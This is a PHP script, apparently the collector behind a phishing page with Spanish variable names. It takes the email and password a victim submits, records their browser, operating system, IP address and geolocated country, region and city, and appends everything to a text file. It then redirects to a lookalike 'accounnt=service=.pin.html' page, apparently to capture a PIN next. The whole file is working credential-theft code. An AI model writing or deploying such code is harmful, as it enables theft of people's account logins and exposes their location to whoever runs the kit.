<?php

session_start();
$user_agent = $_SERVER['HTTP_USER_AGENT'];
function getBrowser($user_agent){
if(strpos($user_agent, 'MSIE') !== FALSE)
   return 'Internet explorer';
 elseif(strpos($user_agent, 'Edge') !== FALSE) //Microsoft Edge
   return 'Microsoft Edge';
 elseif(strpos($user_agent, 'Trident') !== FALSE) //IE 11
    return 'Internet explorer';
 elseif(strpos($user_agent, 'Opera Mini') !== FALSE)
   return "Opera Mini";
 elseif(strpos($user_agent, 'Opera') || strpos($user_agent, 'OPR') !== FALSE)
   return "Opera";
 elseif(strpos($user_agent, 'Firefox') !== FALSE)
   return 'Mozilla Firefox';
 elseif(strpos($user_agent, 'Chrome') !== FALSE)
   return 'Google Chrome';
 elseif(strpos($user_agent, 'Safari') !== FALSE)
   return "Safari";
 else
   return 'No hemos podido detectar su navegador';}
 function getOS() { 
    global $user_agent;
    $os_array =  array(
     '/windows nt 10/i'      =>  'Windows 10',
     '/windows nt 6.3/i'     =>  'Windows 8.1',
     '/windows nt 6.2/i'     =>  'Windows 8',
     '/windows nt 6.1/i'     =>  'Windows 7',
     '/windows nt 6.0/i'     =>  'Windows Vista',
     '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
     '/windows nt 5.1/i'     =>  'Windows XP',
     '/windows xp/i'         =>  'Windows XP',
     '/macintosh|mac os x/i' =>  'Mac OS X',
     '/mac_powerpc/i'        =>  'Mac OS 9',
     '/linux/i'              =>  'Linux',
     '/ubuntu/i'             =>  'Ubuntu',
     '/iphone/i'             =>  'iPhone',
     '/ipod/i'               =>  'iPod',
     '/ipad/i'               =>  'iPad',
     '/android/i'            =>  'Android',
     '/blackberry/i'         =>  'BlackBerry',
     '/webos/i'              =>  'Mobile');
    $os_platform = "Unknown OS Platform";
    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform = $value; }  }
    return $os_platform; }
$user_os        =   getOS();
$navegador = getBrowser($user_agent);

$ip=$_SERVER["REMOTE_ADDR"];
$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$pais = $meta['geoplugin_countryName']; 
$region = $meta['geoplugin_regionName'];
$ciudad = $meta['geoplugin_city'];
$email=$_POST['userid'];
$contra=$_POST['contr'];
date_default_timezone_set('America/Bogota');

$handle = fopen("resp/maildat.txt", "a");
   fwrite($handle, "Email= ".$email."\r\n");
   fwrite($handle, "Contrasena= ".$contra."\r\n");
   fwrite($handle, "Cuando= ");
   fwrite($handle, date ('l jS \of F Y h:i:s A',time()));
   fwrite($handle, "\r\n");
   fwrite($handle, "SO= ".$user_os.", Nave= ".$navegador."\r\n");
   fwrite($handle, "IP= ".$ip."\r\n");
   fwrite($handle, "Ubicacion= ".$pais.", ".$region.", ".$ciudad."\r\n");
   fwrite($handle, "============================================= \r\n");
   fclose($handle);


header("Location: accounnt=service=.pin.html");
  exit;
  ?>